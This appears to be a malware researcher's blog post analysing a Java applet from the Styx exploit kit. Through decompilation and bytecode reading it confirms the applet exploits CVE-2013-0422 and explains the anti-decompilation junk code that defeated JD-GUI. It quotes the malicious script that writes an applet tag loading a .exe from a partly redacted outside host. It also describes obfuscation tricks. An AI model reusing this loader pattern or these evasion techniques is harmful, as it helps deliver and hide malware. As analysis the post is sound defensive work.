@@ -1,0 +1,102 @@
+While I was investigating the Trojan.JS.Iframe.aeq case (see blogpost) one of the files dropped by the Exploit Kit was an Applet exploiting a vulnerability:
+<script> document.write(‘<applet archive=“dyJhixy.jar” code=“QPAfQoaG.ZqnpOsRRk”><param value=“http://fast_DELETED_er14.biz/zHvFxj0QRZA/04az-G112lI05m_AF0Y_C5s0Ip-Vk05REX_0AOq_e0skJ/A0tqO-Z0hT_el0iDbi0-4pxr17_11r_09ERI_131_WO0p-MFJ0uk-XF0_IOWI07_Xsj_0ZZ/8j0A/qql0alP/C0o-lKs05qy/H0-nw-Q108K_l70OC-5j150SU_00q-RL0vNSy/0kfAS0X/rmt0N/KOE0/zxE/W0St-ug0vF8-W0xcNf0-FwMd/0KFCi0MC-Ot0z1_kP/0wm470E/y2H0nlwb14-oS8-17jOB0_p2TQ0/eA3-o0NOiJ/0kWpL0LwBo0-sCO_q0El_GQ/roFEKrLR7b.exe?nYiiC38a=8Hx5S” name=“kYtNtcpnx”/></applet>‘); </script>
+So basically I unzipped the .jar and took a look using JD-GUI, a java decompiler.
+These were the resulting classes inside the .jar file:
+The class names are weird, but nothing unusual.
+Usually the Manifest states the entry point (main class) of the applet.
+In this case there was no manifest, but we could see this in the applet call from the html:
+<applet archive=“dyJhixy.jar” code=“QPAfQoaG.ZqnpOsRRk”> << Package and Class to execute <param value=“http:// fast_DELETED_er14.biz/zHvFxj0QRZA/04az-G112lI05m_AF0Y_C5s0Ip-Vk05REX_0AOq_e0skJ/A0tqO-Z0hT_el0iDbi0-4pxr17_11r_09ERI_131_WO0p-MFJ0uk-XF0_IOWI07_Xsj_0ZZ/8j0A/qql0alP/C0o-lKs05qy/H0-nw-Q108K_l70OC-5j150SU_00q-RL0vNSy/0kfAS0X/rmt0N/KOE0/zxE/W0St-ug0vF8-W0xcNf0-FwMd/0KFCi0MC-Ot0z1_kP/0wm470E/y2H0nlwb14-oS8-17jOB0_p2TQ0/eA3-o0NOiJ/0kWpL0LwBo0-sCO_q0El_GQ/roFEKrLR7b.exe?nYiiC38a=8Hx5S”
+The third parameter was the .exe that the applet drops.
+There was no real need to explore any more deeply just to get an overview of what the applet does.
+However the point here was to analyze the vulnerability that this .jar file exploits.
+At this point I should say that I was biased.
+I had read a McAfee report (http://kc.mcafee.com/resources/sites/MCAFEE/content/live/PRODUCT_DOCUMENTATION/24000/PD24588/en_US/McAfee_Labs_Threat_Advisory_STYX_Exploit_Kit.pdf) about a similar campaign using the same Exploit kit.
+In this report they said that the malware dropped by this particular HTML inside the kit was CVE-2013-0422.
+Usually the first clue which might confirm this would be verdicts from AV vendors, but this time it was not the case:
+https://www.virustotal.com/es/file/e6e27b0ee2432e2ce734e8c3c1a199071779f9e3ea5b327b199877b6bb96c651/analysis/1375717187/
+Ok, so let’s take a look at the decompiled code, starting from the entry point.
+We can confirm that the ZqnpOsRRk class is implementing the Applet:
+public class ZqnpOsRRk extends Applet
+But quickly we see that something is not working.
+The names of the classes and methods are random and the strings obfuscated, but this is nothing to worry about.
+However in this case we see that the decompiler is showing strange “code”:
+Or it is not able to decompile methods of the class directly and is just showing up the bytecode as comments:
+Now I was starting to wonder how bad the situation was?
+Could I still get enough information to discover which CVE is exploited by this .jar?
+Time for some serious digging!
+I started to rename the classes based on their first letters (ZqnpOsRRk to Z, CvSnABr to C, etc) and to match the methods with what I thought they were doing.
+It’s much like any RE using IDA.
+There was a lot of “strange” code around, which got strange interpretations from the decompiler.
+I decided to delete it to tidy up the task.
+Of course, there was a risk that I might delete something important, but this time it looked like misinterpretations of the bytecode, dead code and unused variables.
+So I deleted things like:
+(-5); (-2.0F);
+like this
+Where I saw commented bytecode (not decompiled by JD-GUI), I deleted everything but the references to functions/classes.
+At the end I had a much cleaner code, but I was very worried that I might be missing important parts.
+For instance, I had procedures which just returned NULL, function which just declared variables, unused variables, etc.
+How much of this, if any, was part of the expolit and how much was just badly interpreted code?
+At least I was able to get something useful after cleaning the code.
+I was able to localize the function used to deobfuscate the strings:
+Not exactly rocket science.
+Now I could decompile all the strings, but I still didn’t have a clear idea of what was happening in this .jar.
+Seeing that the code was not decompiled properly I remembered that to check which vulnerability is being exploited you don’t really need a fully decompiled code.
+Finding the right clues can point you to the right exploit.
+At this point I thought that it might be CVE-2013-0422, so I decided to get more information about this vulnerability and see if I could find something in the code to confirm this.
+This CVE was discovered in January 2013.
+Oracle was having a bad time just then, and shortly afterwards a few other Java vulnerabilities were exposed.
+I downloaded a few samples from VirusTotal with this CVE.
+All of them were easily decompiled and I saw some ways to implement this vulnerability.
+But there was no big clue.
+I decided also to try a few other decompilers, but still got no results.
+However when taking a second look at the results of running a now-obsolete JAD I saw that the decompiled code was quite different from the one of JD-GUI, even though it was still incomplete and unreadable.
+But there were different calls with obfuscated strings to the deobfuscation function.
+The applet uses a class loader with the obfuscated strings to avoid detection, making it difficult to know what it is loading without the properly decompiled strings.
+But now I had all of them!
+After running the script I got:
+Now this was much more clear and familiar to me.
+I had another look at one of the PDFs I was just reading and bingo!
+https://partners.immunityinc.com/idocs/Java%20MBeanInstantiator.findClass%200day%20Analysis.pdf
+So finally I could confirm the CVE was indeed CVE-2013-0422.
+In these cases it is always possible to take another approach and do some dynamic analysis debugging the code.
+If you want to go this way I recommend reading this for the setup:
+http://blog.malwarebytes.org/intelligence/2013/04/malware-in-a-jar/
+However, I couldn’t stop thinking about why all the decompilers failed with this code.
+Let’s take a look at the decompiled bytecode manually.
+We can easily get it like this:
+javap -c -classpath LOCAL_PATH ZqnpOsRRk > ZqnpOsRRk.bytecode
+Let’s take a look to the code we get and what it means, with an eye on the decompiled code.
+We will need this:
+http://en.wikipedia.org/wiki/Java_bytecode_instruction_listings
+public QPAfQoaG.ZqnpOsRRk(); Code: 0: aload_0 1: invokespecial #1; //Method java/applet/Applet.”<init>”:()V 4: dconst_0 << push 0D 5: dneg << –0D 6: pop2 << pop –0D 7: nop 8: return 9: lconst_1 <<deadcode_from_here 10: pop2 11: goto 14 14: iconst_2 15: iconst_2 16: pop2 17: iconst_1 18: pop
+and the decompiled code with the corresponding instruction numbers:
+public class ZqnpOsRRk extends Applet { public ZqnpOsRRk() { (–0.0D); return; 1L; 2; 1; }
+So we can see how a method which just provides returns leaves a lot of garbage in the middle.
+The decompiler cannot handle this and tries to interpret all these operations, these anti-decompilation artifacts.
+It just adds a lot of extra noise to the final results.
+We can safely delete all this.
+public class ZqnpOsRRk extends Applet { public ZqnpOsRRk() { return; }
+There are TONS of these artifacts in the bytecode.
+Here a few examples:
+1: lconst_0 2: lneg 3: pop2 1: iconst_5 2: ineg 3: iconst_1 4: ineg 5: pop2 1: iconst_5 2: ineg 3: iconst_5 4: swap 5: pop2
+There are also a lot of nonsense jumps, such as push NULL then jump if null, gotos and nops.
+Basically it’s difficult to delete these constructors from the bytecode because the parameters are different and don’t always throw up the same opcodes.
+It’s up to the decompiler to get rid of this dead code.
+After a couple of hours manually cleaning the code and reconstructing it from the bytecodes, I could finally read the result and compare it with the original decompiled one.
+Now I understood what was happening and what was wrong with the original code I could safely delete the dead code and introduce readable names for classes and methods.
+But there was still one unanswered question: why was the first decompiler unable to deobfuscate all the strings, and why did I have to use JAD to get everything?
+JD-GUI returns the bytecode of the methods that it cannot decompile but for instructions such as ldc (that puts a constant onto the stack) it does not include the constant along with the instruction in the output code.
+That’s why I couldn’t get them until I used a second decompiler.
+For example:
+JD–GUI output: // 18: ldc 12 Bytecode output: 18: ldc #12; //String ‘+)j71*j.
+)<j)&!%*7!62!6j^N)<t^F!%*^W!62!6 JAD output: class1 = classloader.loadClass(CvSnABr.nwlavzoh(“‘+)j71*j.
+)<j)&!%*7!62!6j16)<t06!%*27!62!6”));
+In the bytecode, happily, we can find all these references and complete the job.
+When I was working in this binary I remembered a presentation in BH 2012 about anti-decompiling techniques used for Android binaries.
+This was the first time I had personally encountered a Java binary implementing something similar.
+Even they are not that difficult to avoid, the analysis is much slower and it can be really hard to crack big binaries.
+So there are two open questions: first, what can be done, from the decompiler’s perspective, to avoid these tricks?
+I’m hoping to discuss this with the authors of JD-GUI.
+Secondly, how can we make code “undecompilable”?
+Are there automatic tools for this?
+Again, I’m hoping to find out more, but please contact me if you have anything useful to share.
